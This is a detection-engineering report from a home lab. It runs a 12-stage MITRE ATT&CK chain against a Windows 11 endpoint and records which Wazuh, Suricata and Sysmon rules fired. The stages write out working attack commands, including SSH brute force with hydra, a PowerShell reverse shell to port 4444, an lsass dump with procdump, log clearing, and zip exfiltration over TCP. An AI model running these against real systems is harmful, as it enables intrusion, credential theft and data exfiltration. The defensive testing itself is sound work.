---
title: "SOC Home Lab — Threat Emulation Report (Full Attack Chain)"
tags: [Blue Team, SOC Home Lab, Threat emulation, Detection engineering]
lang: en
breaks: true
---

# 04 — Threat Emulation Report: Full Attack Chain

[TOC]

| Item | Value |
|---|---|
| Author | Võ Minh Khoa |
| Environment | Isolated VMware lab (Wazuh, Suricata, pfSense, Sysmon) |
| Evidence window | 2026-08-28 → 2026-08-29 (alert timestamps, UTC) |
| Sources | Two lab writeups: baseline detection engineering report and the full attacking-chain playbook |
| Related documents | [`01` setup](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/docs/01-infrastructure-setup.md) · [`02` ingestion](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/docs/02-log-ingestion-pipeline.md) · [`03` decoders & rules](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/docs/03-Detection-engineering.md) |

---

## 1. Executive Summary

A 12-step attack chain — **Reconnaissance → Exfiltration** — was emulated against a Windows 11 endpoint to validate the custom detections described in `docs/03`. Each step maps to a MITRE ATT&CK technique and was run from a Kali Linux host inside an isolated lab.

**Results** (based on the evidence preserved in the two writeups):

| Outcome | Steps | Count |
|---|---|---|
| ✅ Detected by the designed custom rule, raw alert preserved | 2 (Brute Force), 4 (Execution), 6 (Payload Drop), 8 (C2) | 4 |
| ⚠️ Detected, but by a built-in rule instead of the designed custom rule | 5 (Discovery), 7 (Persistence), 10 (Anti-Forensics) | 3 |
| ✅ Detected, screenshot evidence only | 9 (File Lifecycle) | 1 |
| ⚠️ Inconclusive, or evidence does not match the stage | 1 (Reconnaissance), 3 (Successful Access), 8b (LSASS access) | 3 |
| ❌ No evidence yet | 11 (Exfiltration) | 1 |

**Key findings**

1. **The chain is observable end to end across four independent layers**: network (Suricata), firewall (pfSense), host (Sysmon and Windows Security log) and file/reputation (FIM and VirusTotal).
2. **Of the alerts tied to the emulated behaviour, only four came from custom rules** (`100301`, `100304`, `100306`, `100401`). In Stages 5, 7 and 10 a **built-in Wazuh rule fired instead of the designed custom rule** (`92031`, `92302`, `63103`). The behaviour was detected, but the custom rule was not proven.
3. **Three steps need a re-run**: Stage 1 (the pfSense alert shown is unrelated loopback DNS traffic), Stage 3 (the evidence is an account lockout, not a successful logon) and Stage 8b (no raw alert; the committed Sysmon configuration did not log the required event at the time).
4. **Stage 11 (exfiltration) has no captured evidence** and is the highest-priority item to complete.
5. **Log clearing did not blind the SOC**: the Security log was wiped on the endpoint, yet the alert had already been forwarded to Wazuh.

---

## 2. Scope, Rules of Engagement and Environment

### 2.1 Rules of engagement

- All activity ran inside an isolated lab network against systems owned by the author.
- Payloads were benign: the EICAR test string, `calc.exe` as the persistence target, and a self-written reverse shell using the standard .NET `TCPClient` (no vulnerability exploited).
- Every artifact created by the emulation is listed in [Appendix B](#appendix-b--artifacts-and-cleanup) together with its cleanup command.

### 2.2 Environment

![Figure 1 — Lab architecture and data flow](https://raw.githubusercontent.com/Khoavo-187/Wazuh-siem-home-lab/main/architecture/Architecture-and-data-flow.png)

*Figure 1 — Lab architecture and data flow.*

| Host | Role | IP |
|---|---|---|
| Kali Linux | Attacker | `192.168.60.135` (LAN) |
| Windows 11 (`LAPTOP-VF92GC15`) | Victim, Wazuh agent, Sysmon, Suricata (Npcap), FIM | `192.168.60.1` |
| Wazuh Manager | SIEM/XDR, VirusTotal integration | `192.168.60.137` |
| pfSense | Firewall and gateway, remote syslog | `192.168.60.254` |

### 2.3 Telemetry preconditions

A rule can only fire if its event exists. Before the run these items were checked or enabled:

| Layer | Requirement | Used by |
|---|---|---|
| Windows | Advanced audit policy: Logon (success and failure), Process Creation with command line | Events `4624`, `4625`, `4688` |
| Sysmon | Event IDs 1, 3, 10, 11, 13 present in the configuration | Stages 4–8b, 11 |
| Wazuh agent | Channels `Security`, `Sysmon/Operational`; Suricata `eve.json`; FIM `realtime="yes"` on the `virustotaltest` folder | All |
| Wazuh manager | Custom rules loaded (`wazuh-logtest`), VirusTotal integration active | All |
| Environment | NTP synced on all hosts, clean dashboard baseline, start timestamp recorded (`date -u`), `procdump.exe` pre-staged | Timeline, Stage 8b |

### 2.4 Verdict criteria

| Verdict | Meaning |
|---|---|
| ✅ | A raw alert (or a screenshot of it) shows the expected behaviour was detected |
| ⚠️ | An alert exists but does not match the stage, or a different rule fired than the one designed, or the evidence is condensed |
| ❌ | No alert evidence |

---

## 3. Emulation Plan

| # | Stage | Tactic | Technique | Procedure (tool, source → target) | Telemetry expected | Detection expected |
|---|---|---|---|---|---|---|
| 0 | Preparation | — | — | Remove old Hydra session; full packet capture with `tcpdump` on Kali | pcap | — |
| 1 | Reconnaissance | Reconnaissance, Discovery | T1595, T1018 | `nmap -sS -T4 -p-`, `ping -c 5` — Kali → `192.168.60.1` | Suricata alert, pfSense log | Suricata `100300`, pfSense `100130`/`100201` |
| 2 | Brute Force | Credential Access | T1110 | `hydra` against SSH (`user.txt`, `password.txt`) — Kali → `:22` | Suricata alert, Windows `4625` | `100301`, `60122` |
| 3 | Successful Access | Initial Access | T1078 | `ssh lenovo@192.168.60.1` with the cracked credentials | Windows `4624` | `100410` (correlation) |
| 4 | Execution | Execution, Defense Evasion | T1059.001, T1027 | `powershell -NoProfile -EncodedCommand <base64>` | Sysmon EID 1 | `100401` |
| 5 | Discovery | Discovery | T1087, T1082, T1033 | `whoami`, `dir`, `net localgroup administrators`, `arp -a`, `systeminfo`, `tasklist` over SSH | Sysmon EID 1 | `100402`, `100407`, built-in `92031` |
| 6 | Payload Drop | Command and Control | T1105 | `python3 -m http.server 8000` on Kali; `curl` the EICAR file from the endpoint | Suricata alert, FIM, VirusTotal | `100306`, FIM, `87105` |
| 7 | Persistence | Persistence | T1547.001 | `reg add HKCU\...\CurrentVersion\Run /v UpdaterSvc` (target `calc.exe`) | Sysmon EID 13 | `100406` |
| 8 | Command and Control | Command and Control | T1071 | `nc -lvnp 4444` on Kali; PowerShell `TCPClient` reverse shell from the endpoint | Suricata alert, Sysmon EID 3 | `100304` |
| 8b | Credential Access | Credential Access | T1003.001 | `procdump -ma lsass.exe` through the reverse shell | Sysmon EID 10 | `100411` |
| 9 | File Lifecycle | — | — | Modify and delete files in the monitored folder | syscheck events | FIM (modified, deleted) |
| 10 | Cleanup / Anti-Forensics | Defense Evasion | T1070.001 | `wevtutil cl Security` | Security Event `1102` | `100412` |
| 11 | Exfiltration | Exfiltration | T1041 | `Compress-Archive`, then `TCPClient` sends the zip to Kali `:4445` | Sysmon EID 3 | `100413` |

---

## 4. Execution and Analysis by Stage

Each stage lists the emulated behaviour, the telemetry it produced, the alert observed, the screenshots kept in the writeup, and an analysis of what the result does and does not prove. Times are UTC (the lab's local time is UTC+7).

### Stage 0 — Preparation

```bash
# Kali
rm -f hydra.restore
sudo tcpdump -i eth0 -w full_chain_$(date +%Y%m%d_%H%M).pcap host 192.168.60.1 &
```

A packet capture for the whole chain gives an independent record to cross-check Suricata and pfSense. The capture file itself is not part of the repository.

---

### Stage 1 — Reconnaissance (T1595, T1018)

```bash
# Kali
nmap -sS -T4 -p- 192.168.60.1
ping -c 5 192.168.60.1
```

![Figure 2 — Stage 1 evidence screenshot](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage1_recon.png)

*Figure 2 — Stage 1: reconnaissance evidence screenshot (as placed in the original writeup).*

**Alert observed**

| Field | Value |
|---|---|
| Rule | `100140` — pfSense TCP burst, level 6 (earlier rule version) |
| Alert time | 2026-08-28 05:32:14 |
| Log line | `filterlog`, interface `lo0`, `pass`, UDP, `127.0.0.1` → `127.0.0.1:53` |
| Decoder | `pfsense-lab` |

**Analysis**

- **The alert is not caused by the scan.** Source and destination are the loopback address, the interface is `lo0` and the port is 53 (DNS). It is background DNS traffic on the firewall itself, not Nmap traffic from Kali.
- **pfSense is probably not the right sensor for this step.** Kali and the Windows host sit in the same `/24`, and a firewall only logs traffic that crosses it (inference). This is the east-west case that motivates the second Suricata instance on the endpoint, so the expected alert is Suricata `100300` (sid `1000002`). No raw alert for it is preserved for this run.
- **Clock offset on pfSense.** The syslog timestamp in the log line is `Aug 27 11:57:42`, while Wazuh received the event on 2026-08-28 at 05:32 UTC, a gap of about 17.5 hours. This points to a time-zone or NTP problem on pfSense and would break cross-source correlation.
- **The false positive is already addressed.** The current version of `100140` only counts connections to administrative ports (`22, 23, 445, 3389, 5900, 1433, 3306`), so loopback DNS no longer matches.

**Verdict: ⚠️ Inconclusive** — re-run and capture the Suricata `100300` alert (see §7).

---

### Stage 2 — Brute Force (T1110)

```bash
# Kali
hydra -L user.txt -P password.txt ssh://192.168.60.1
```

![Figure 3 — Stage 2 evidence screenshot](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage2_bruteforce.png)

*Figure 3 — Stage 2: brute-force evidence screenshot (as placed in the original writeup).*

**Alerts observed**

| Layer | Rule | Level | Time | Key fields |
|---|---|---|---|---|
| Network (Suricata on the endpoint) | `100301` (sid `1000003`, rev 2) | 8 | 05:45:44 | `192.168.60.135:51814` → `192.168.60.1:22`, TCP, MITRE T1110 / TA0006 |
| Host (Windows Security) | `60122` (Event `4625`) | 5 | 05:46:41 | `targetUserName: lenovo`, `logonType: 8`, process `sshd.exe`, `subStatus: 0xc000006a` (wrong password) |

**Analysis**

- **Two independent layers saw the same attack**: the network sensor counted repeated connection attempts to port 22, and the host recorded each failed logon. Either one alone would be weaker evidence.
- `logonType 8` and `sshd.exe` confirm the failures came through OpenSSH for Windows, not an interactive logon.
- **Correlation limitation.** The `4625` event does **not** contain an `ipAddress` field (OpenSSH does not populate it). Rules `100408` and `100410` correlate on `win.eventdata.ipAddress`, so for SSH they will probably never chain (to confirm with `wazuh-logtest`). Correlating on `win.eventdata.targetUserName` is the practical fix.
- Wazuh's built-in mapping for `60122` is T1531 (Account Access Removal). The brute-force meaning comes from `100301`, not from the built-in tag.
- Hydra initially stopped with "all children disabled"; OpenSSH `MaxStartups` throttling was the cause and was resolved by raising it and lowering the thread count.

**Verdict: ✅ Detected** (custom `100301` plus built-in `60122`).

---

### Stage 3 — Successful Access (T1078)

```bash
# Kali — log in with the cracked credentials
ssh lenovo@192.168.60.1
```

![Figure 4 — Stage 3 evidence screenshot](https://hackmd.io/_uploads/H1kimjADMx.png](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage3_access.png))

*Figure 4 — Stage 3 evidence screenshot (as placed in the original writeup).*

**Alert observed**

| Field | Value |
|---|---|
| Rule | `60115` — user account locked out, level 9 |
| Event | Windows `4740` for account `LENOVO` |
| Time | 05:46:41 (event time) — the same second as a failed logon of Stage 2 |
| Mapping | T1110, T1531 |

The correlation rule `100410` is shown only as a trimmed JSON excerpt (`rule.id`, `level`, `description`, `srcip`), from an older version whose logic pointed at the failed-logon rule instead of a successful logon.

**Analysis**

- **The evidence does not prove a successful login.** Event `4740` shows that the brute force locked the account, which is an impact of Stage 2. The goal of this stage, valid-account use, was not demonstrated.
- A locked account would also have blocked the cracked credentials, so the lockout likely prevented this stage from succeeding at that moment.
- The current `100410` requires a `4624` logon after `100408` from the same `ipAddress`. Because SSH logons carry no `ipAddress` (see Stage 2), the chain would need a different correlation key.

**Verdict: ⚠️ Evidence does not match the stage** — re-run with an unlocked account and capture a real `4624` plus the `100410` alert.

---

### Stage 4 — Execution (T1059.001, T1027)

```powershell
$cmd   = 'whoami; hostname; ipconfig /all'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$enc   = [Convert]::ToBase64String($bytes)
powershell.exe -NoProfile -EncodedCommand $enc
```

**Alert observed**

| Field | Value |
|---|---|
| Rule | `100401` — encoded PowerShell command, level 10 (T1027, T1059.001) |
| Time | 2026-08-28 06:34:55 |
| Process | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, integrity `High` |
| Parent | `powershell.exe` |
| User | `LAPTOP-VF92GC15\LENOVO` |
| Command line | `powershell.exe -NoProfile -EncodedCommand dwBoAG8AYQBtAGkAOwAg…` |
| Decoded payload | `whoami; hostname; ipconfig /all` |

**Analysis**

- The Base64 string is UTF-16LE, the encoding PowerShell expects, and decodes cleanly to the three discovery commands. Seeing the full command line in Sysmon makes the obfuscation trivial to reverse during triage.
- **Why it fired:** the evidence version of `100401` is a child of `100400`, which requires the parent process to be PowerShell. The test ran PowerShell from a PowerShell session, so the chain matched. A launch from `cmd.exe` or `explorer.exe` would not have matched; the version now in the repository is independent of the parent and also accepts the `-e` and `-ec` abbreviations.
- No screenshot was kept for this stage; the raw alert is the evidence.

**Verdict: ✅ Detected** (custom `100401`).

---

### Stage 5 — Discovery (T1087, T1082, T1033)

```cmd
:: executed over the SSH session from Kali
whoami
dir
net localgroup administrators
arp -a
systeminfo
tasklist
```

![Figure 5 — Stage 5 evidence screenshot](https://hackmd.io/_uploads/Byvden0DGe.png](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage5_discovery.png))

*Figure 5 — Stage 5 evidence screenshot (as placed in the original writeup).*

**Alert observed**

| Field | Value |
|---|---|
| Rule | `92031` — built-in Sysmon rule, Account Discovery (T1087) |
| Time | 2026-08-28 06:48:04 |
| Process | `net1.exe`, spawned by `net.exe` |
| Command line | `net1 localgroup administrators` |
| User / integrity | `LAPTOP-VF92GC15\LENOVO` / `High` |

**Analysis**

- Discovery was detected, but by a **built-in rule**. The custom `100400` and `100402` were the expected triggers and were not observed.
- **The custom rules do not target these commands.** `100402` matches only `whoami`, `systeminfo`, `tasklist` and `nltest`, so `net.exe`, `net1.exe`, `arp.exe` and `dir` are outside its scope. `100400` requires a PowerShell parent, but the commands ran from an SSH command shell.
- `100407` (three discovery binaries by the same user within 120 seconds) should be satisfied by `whoami`, `systeminfo` and `tasklist` run in close succession, but no alert for it was captured.
- Known false positive: processes spawned from `ossec-agent\` under `SYSTEM` (the Wazuh SCA module) also trigger `T1087`. Checking `currentDirectory` and `user` separates it from attacker activity.

**Verdict: ⚠️ Detected by built-in rule `92031`**; custom rules not proven.

---

### Stage 6 — Payload Drop (T1105)

```bash
# Terminal 1 (Kali)
python3 -m http.server 8000
```

```cmd
:: Terminal 2 — SSH session on the victim
curl http://192.168.60.135:8000/eicar-facebook.com -o "C:\Users\LENOVO\Downloads\virustotaltest\eicar2.com"
```

![Figure 6 — Stage 6 evidence screenshot 1 of 3](https://hackmd.io/_uploads/ryHT4hRwze.png](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage6_payload1.png))

![Figure 7 — Stage 6 evidence screenshot 2 of 3](https://hackmd.io/_uploads/ryHT4hRwze.png](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage6_payload2.png))

![Figure 8 — Stage 6 evidence screenshot 3 of 3](https://hackmd.io/_uploads/ryHT4hRwze.png](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage6_payload3.png))

*Figures 6–8 — Stage 6: the three alerts raised by one download (Suricata, FIM, VirusTotal), as placed in the original writeup.*

**Three layers fired from one action**

| Layer | Rule | What it shows |
|---|---|---|
| Network | `100306` (sid `1000008`) | `GET /eicar-facebook.com` from `192.168.60.135:8000` to `192.168.60.1:58826`, user-agent `curl/8.21.0`, HTTP 200, 69 bytes, MITRE T1105 — alert time 2026-08-28 07:09:53 |
| Host file | FIM (syscheck) "file added", level 5 | A new file appeared in the monitored folder |
| Reputation | `87105` — VirusTotal, level 12 | Hash looked up automatically; earlier lab run: `found: 1`, `positives: 62`, md5 `44d88612fea8a8f36de82e1278abb02f` |

**Analysis**

- This is the clearest example of **defense in depth**: the network sensor sees the transfer, FIM sees the file land, and VirusTotal says the hash is malicious. Losing one layer still leaves two.
- The standard EICAR file was used because its hash is known worldwide; a self-made test file returned `found: 0` in an earlier attempt.
- **Limits.** Suricata inspects the HTTP body only in clear text. The built-in `87105` rule tags the event as T1203 (Exploitation for Client Execution), not T1105.
- **Rules that did not match this download.** The curl-download rule (`1000011`) requires a URI ending in `.sh`, `.ps1`, `.exe`, `.bat` or `.dll`, so `.com` does not match.
- The raw VirusTotal alert preserved in the baseline report dates from an earlier run on 2026-08-17; for this chain the VirusTotal and FIM alerts are documented by the screenshots.

**Verdict: ✅ Detected** (custom `100306` with raw alert; FIM and VirusTotal by screenshot).

---

### Stage 7 — Persistence (T1547.001)

```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdaterSvc" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
```

![Figure 9 — Stage 7 evidence screenshot](https://hackmd.io/_uploads/ryHT4hRwze.png](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage7_persistence.png))

*Figure 9 — Stage 7 evidence screenshot (as placed in the original writeup).*

**Alert observed**

| Field | Value |
|---|---|
| Rule | `92302` — built-in Sysmon registry Run key rule (T1547.001), level 6 |
| Event | Sysmon EID 13, `SetValue` |
| Time | 2026-08-28 07:46:46 |
| Process | `C:\Windows\system32\reg.exe` |
| Target | `HKU\S-1-5-21-…-1001\Software\Microsoft\Windows\CurrentVersion\Run\UpdaterSvc` |
| Value written | `C:\Windows\System32\calc.exe` |
| Sysmon rule name | `T1060,RunKey` (tag from the SwiftOnSecurity configuration) |

**Analysis**

- Persistence is detected at **write time**, not when the program later launches.
- Sysmon records the key under `HKU\<SID>` rather than `HKCU`; the custom rule `100406` matches on the `\CurrentVersion\Run` part of the path, so it should apply.
- **Custom rule not proven.** The built-in `92302` fired at level 6 while the custom `100406` (level 10) did not appear. This matches the precedence hypothesis described in `docs/03` (section 5): a built-in sibling rule can win. It needs a `wazuh-logtest` run to confirm.
- The Sysmon tag `T1060` is a legacy technique ID, now merged into `T1547.001`; the MITRE tag in the Wazuh alert is the current one.

**Verdict: ⚠️ Detected by built-in rule**; custom `100406` not proven.

---

### Stage 8 — Command and Control (T1071)

```bash
# Kali — listener
nc -lvnp 4444
```

```powershell
# Windows — reverse shell started from the SSH session
$client = New-Object System.Net.Sockets.TCPClient("192.168.60.135",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | %{0}
while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([Text.Encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

![Figure 10 — Stage 8 evidence screenshot](https://hackmd.io/_uploads/ryHT4hRwze.png](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage8_C2.png))

*Figure 10 — Stage 8 evidence screenshot (as placed in the original writeup).*

**Alert observed**

| Field | Value |
|---|---|
| Rule | `100304` (sid `1000006`, rev 2) — possible reverse shell, suspicious outbound port, level 12 |
| Time | 2026-08-29 07:45:49 |
| Connection | `192.168.60.1:62602` → `192.168.60.135:4444`, TCP |
| Flow | 1 packet to server (66 bytes), 0 to client — the first packet only |
| MITRE | T1071 / TA0011 |

**Analysis**

- The connection direction is the point: the **victim initiates** the outbound session to the attacker, which is how reverse shells slip past inbound filtering. The attacker started it by running the PowerShell code through SSH.
- **The evidence is from rule revision 2**, which fired on the first packet (the flow shows no reply). The current revision 3 requires an established flow, so this stage should be re-run to confirm the newer rule still triggers once the listener completes the handshake.
- The payload is PowerShell, so the banner-based rule `1000010` (which matches the `cmd.exe` banner) is not expected to fire.
- Endpoint-side rules (`100404`, outbound connection from PowerShell) were also expected but no Sysmon alert for this connection is preserved.
- Port `4444` is a signature-style indicator; the detection works for this test but would miss the same shell on another port (see recommendations).

**Verdict: ✅ Detected at the network layer** (custom `100304`); endpoint layer not evidenced.

---

### Stage 8b — Credential Access, LSASS (T1003.001)

```powershell
# through the reverse shell, procdump pre-staged on the victim
procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass_test.dmp
```

No screenshot was kept for this stage.

**Evidence available:** a trimmed JSON excerpt showing `rule.id: 100411`, level 14, `sourceImage: C:\Windows\System32\procdump.exe` and `targetImage: ...\lsass.exe`. It lacks the standard alert fields (`_index`, `agent`, `decoder`, `timestamp`, `location`).

**Analysis**

- The excerpt is a summary, not a raw alert, and the rule version it came from was the first draft (no allow-list, group `sysmon_process_access`).
- **Telemetry gap:** `100411` needs Sysmon Event ID 10. The `ProcessAccess` section of the configuration committed to the repository was empty at the time of review, so no such event was produced. It has since been enabled with a filter on `lsass.exe`.
- The current rule adds an allow-list by full executable path, a `GrantedAccess` filter and a child rule (`100416`, level 15) for memory-dump call traces. None of that has been exercised yet.

**Verdict: ⚠️ Not proven** — re-run with Sysmon Event ID 10 enabled and capture the raw alert (see §7).

---

### Stage 9 — File Lifecycle (FIM)

```powershell
# through the reverse shell
Add-Content -Path C:\Users\LENOVO\Downloads\virustotaltest\eicar.com -Value "modified"
Remove-Item C:\Users\LENOVO\Downloads\virustotaltest\eicar2.txt -Force
```

![Figure 11 — Stage 9 evidence screenshot](https://hackmd.io/_uploads/ryHT4hRwze.png](https://github.com/Khoavo-187/Wazuh-siem-home-lab/blob/main/screenshot/Stage9_fim.png))

*Figure 11 — Stage 9: file modified and file deleted, as placed in the original writeup.*

**Analysis**

- With `realtime="yes"` on the monitored folder, Wazuh's syscheck raises an alert for each change: "integrity checksum changed" (rule `550`, level 7) when the content is modified, and a deletion alert when the file is removed.
- This stage covers the part of an intrusion that leaves traces on disk after the payload landed in Stage 6: tampering with, and removal of, files.
- The evidence is a screenshot; no raw alert is preserved.
- File names differ between stages (`eicar2.com` is created in Stage 6, `eicar2.txt` is deleted here). Use the same names so the story is traceable.

**Verdict: ✅ Detected** (screenshot evidence only).

---

### Stage 10 — Cleanup / Anti-Forensics (T1070.001)

```powershell
# through the reverse shell
wevtutil cl Security
# or
Clear-EventLog -LogName Security
```

No screenshot was kept for this stage.

**Alert observed**

| Field | Value |
|---|---|
| Rule | `63103` — built-in "audit log cleared", level 5 (T1070, Indicator Removal) |
| Event | Windows Security `1102` |
| Time | 2026-08-29 08:39:25 |
| Subject | account `LENOVO`, logon ID `0x3cdb2` |

**Analysis**

- Event `1102` is written even when an attacker wipes the log. Because Wazuh had already forwarded the events, **the cleared history remains available in the SIEM**, which is the point of shipping logs off the host in real time.
- The built-in `63103` fired at level 5; the custom `100412` (level 15) did not appear. The same precedence hypothesis applies as in Stage 7. The version of `100412` in the evidence was a child of `60000`; the repository version now chains from `60117`, which has not been verified against a real event.
- A level-5 alert for a log wipe is too quiet for a SOC; the intent of `100412` is to escalate it.

**Verdict: ⚠️ Detected by built-in rule**; custom `100412` not proven.

---

### Stage 11 — Exfiltration (T1041)

```bash
# Kali — receive the file
nc -lvnp 4445 > received_exfil.zip
```

```powershell
# Windows — through the reverse shell
Compress-Archive -Path C:\Users\LENOVO\Downloads\virustotaltest -DestinationPath C:\Windows\Temp\exfil_test.zip -Force

$client = New-Object System.Net.Sockets.TCPClient("192.168.60.135", 4445)
$stream = $client.GetStream()
$bytes  = [System.IO.File]::ReadAllBytes("C:\Windows\Temp\exfil_test.zip")
$stream.Write($bytes, 0, $bytes.Length)
$stream.Close()
$client.Close()
```

**Status:** the writeup contains the procedure and the expected trigger (Sysmon Event ID 3, `powershell.exe` connecting to port 4445) but **no alert, no screenshot and no file-integrity check**.

**What a complete run should show**

| Check | Expected result |
|---|---|
| Sysmon EID 3 | `powershell.exe` → `192.168.60.135:4445` → alert `100413` (and `100404` / `100414` for the same connection) |
| File creation | Zip written under `\Windows\Temp\` — candidate for `100405` if Sysmon logs the extension |
| Data arrived | `Get-FileHash` of `exfil_test.zip` on Windows equals `sha256sum received_exfil.zip` on Kali |

Detection on port `4445` is signature-based and specific to this lab. A real SOC would add volume- or behaviour-based detection (unusual outbound transfer size, scripting engine talking to a rare destination).

**Verdict: ❌ Not evidenced** — highest-priority item to complete.

---

## 5. Attack Timeline (UTC)

The chain was run in two sessions: Stages 1–7 on 2026-08-28 and Stages 8–10 on 2026-08-29. Times are taken from the preserved alerts (event time).

| Stage | Date and time | Event | Source |
|---|---|---|---|
| 1 | 2026-08-28 05:32:14 | pfSense burst alert (loopback DNS, not attributable to the scan) | pfSense `100140` |
| 2 | 2026-08-28 05:45:44 | Repeated SSH connection attempts from Kali | Suricata `100301` |
| 2 | 2026-08-28 05:46:41 | Failed logon through `sshd.exe` (`lenovo`) | Windows `60122` |
| 3 | 2026-08-28 05:46:41 | Account `LENOVO` locked out | Windows `60115` |
| 4 | 2026-08-28 06:34:55 | Encoded PowerShell command | Sysmon `100401` |
| 5 | 2026-08-28 06:48:04 | `net1 localgroup administrators` | Sysmon `92031` (built-in) |
| 6 | 2026-08-28 07:09:53 | EICAR file downloaded over HTTP | Suricata `100306` |
| 7 | 2026-08-28 07:46:46 | `UpdaterSvc` Run key written | Sysmon `92302` (built-in) |
| 8 | 2026-08-29 07:45:49 | Outbound connection to Kali on port 4444 | Suricata `100304` |
| 8b, 9, 11 | — | No timestamp preserved in the writeups | — |
| 10 | 2026-08-29 08:39:25 | Security log cleared (Event `1102`) | Windows `63103` (built-in) |

---

## 6. Detection Coverage Results

| Stage | Custom rule expected | Rule that fired | Layer | Custom rule proven | Verdict |
|---|---|---|---|---|---|
| 1 Reconnaissance | `100300`, `100130`, `100201` | `100140` (unrelated traffic) | pfSense | ❌ | ⚠️ |
| 2 Brute Force | `100301` | `100301`, `60122` | Suricata, Windows | ✅ | ✅ |
| 3 Successful Access | `100410` | `60115` (lockout) | Windows | ❌ | ⚠️ |
| 4 Execution | `100401` | `100401` | Sysmon | ✅ | ✅ |
| 5 Discovery | `100400`, `100402`, `100407` | `92031` | Sysmon (built-in) | ❌ | ⚠️ |
| 6 Payload Drop | `100306` | `100306`, FIM, `87105` | Suricata, FIM, VirusTotal | ✅ | ✅ |
| 7 Persistence | `100406` | `92302` | Sysmon (built-in) | ❌ | ⚠️ |
| 8 Command and Control | `100304` | `100304` (rev 2) | Suricata | ✅ | ✅ |
| 8b LSASS | `100411` | trimmed excerpt only | Sysmon | ❌ | ⚠️ |
| 9 File Lifecycle | FIM modified / deleted | syscheck (screenshot) | FIM | n/a | ✅ |
| 10 Anti-Forensics | `100412` | `63103` (built-in) | Windows | ❌ | ⚠️ |
| 11 Exfiltration | `100413` | none | — | ❌ | ❌ |

**Reading the results**

- **Behaviour coverage is better than rule coverage.** Eight of twelve steps were detected (seven with a raw alert, one by screenshot), but only four of them by the designed custom rule.
- Every ⚠️ in Stages 5, 7 and 10 follows the same pattern: a built-in rule matched first. This is the single most valuable thing to resolve, because it affects how the custom rules are written and ordered (see `docs/03`, section 5).
- Network detections (Suricata) were the most reliable: three of the four custom rules proven are Suricata rules.

---

## 7. Gap Analysis and Re-test Plan

| Priority | Stage | Gap | Action | Pass criteria |
|---|---|---|---|---|
| P1 | 11 | No evidence | Run the full procedure with Sysmon EID 3 enabled for the process | Raw alert `100413`; file hashes match on both hosts |
| P1 | 8b | No raw alert; Event ID 10 was not logged by the committed Sysmon configuration | Reload the configuration (`sysmon64.exe -c`), re-run ProcDump, export the raw alerts | Raw alerts `100411` and, if the call trace matches, `100416`; `GrantedAccess` recorded |
| P1 | 3 | Evidence is a lockout, not a logon | Unlock the account, run the login with a separate account or fewer Hydra attempts | Raw Event `4624` and an alert from `100410` |
| P2 | 1 | Alert unrelated to the scan; no Suricata raw alert; pfSense clock offset | Re-run Nmap and capture Suricata `100300`; correct time zone / NTP on pfSense | Raw `100300` alert; pfSense timestamps within seconds of the manager |
| P2 | 5, 7, 10 | Built-in rule fired instead of the custom rule | Feed the real raw event to `wazuh-logtest`; reorder or chain the custom rule under the built-in parent | Custom rule ID is the one reported by `wazuh-logtest` |
| P2 | 2, 3 | SSH `4625` has no `ipAddress` | Correlate `100408` / `100410` on `win.eventdata.targetUserName` | Both rules fire in a repeat of Stages 2–3 |
| P3 | 5 | `100402` does not cover `net`, `net1`, `arp` | Extend the binary list or add a separate low-level rule | Alert for `net localgroup administrators` |
| P3 | 6 | `1000011` does not match `.com` | Add `com`, `scr`, `vbs`, `js`, `msi` to the extension list | Alert on the EICAR URL |
| P3 | 8 | Evidence is from rule revision 2 | Re-run with the listener up so the handshake completes | `100304` fires on revision 3 |
| P3 | 6, 9 | FIM and VirusTotal evidence are screenshots | Export raw alert JSON and note the rule IDs | Raw JSON stored in the repository |
| P3 | All | Command typos hurt reproducibility | Apply the corrections in [Appendix C](#appendix-c--reproducibility-notes) | — |

---

## 8. Defensive Recommendations

| Stage | Prevent | Detect | Respond |
|---|---|---|---|
| LSASS access | Credential Guard, restrict dump tools | `ProcessAccess` on `lsass.exe` with suspicious access masks | Treat all credentials on the host as exposed |
| Anti-Forensics | Forward logs off-host in real time | Dedicated alert for Events `1102` / `1100` | Preserve the SIEM copy as evidence |
| Exfiltration | DLP, egress allow-lists | Volume- and behaviour-based network detection | Block the channel, assess data exposure |

---

## 9. Conclusion

The lab shows that the planned detections can follow an intrusion from the first scan to data theft across several independent sources, and that logs forwarded off the host survive an attacker's cleanup. It also shows where the work is unfinished: half of the custom endpoint rules have not been proven because built-in rules fire first, three steps need a re-run, and exfiltration has no evidence yet. Section 7 lists the re-tests in priority order; completing the P1 items would give every stage a raw alert.

---

## Appendix A — Screenshot Index

The images are hosted on HackMD. Keep local copies in the repository so the report does not depend on an external host.

| Figure | Stage | Source | Suggested local file |
|---|---|---|---|
| 1 | Architecture | Repository image (`architecture/`) | — |
| 2 | 1 Reconnaissance | `hackmd.io/_uploads/Sk-LnqADfl.png` | `screenshots/stage1-recon.png` |
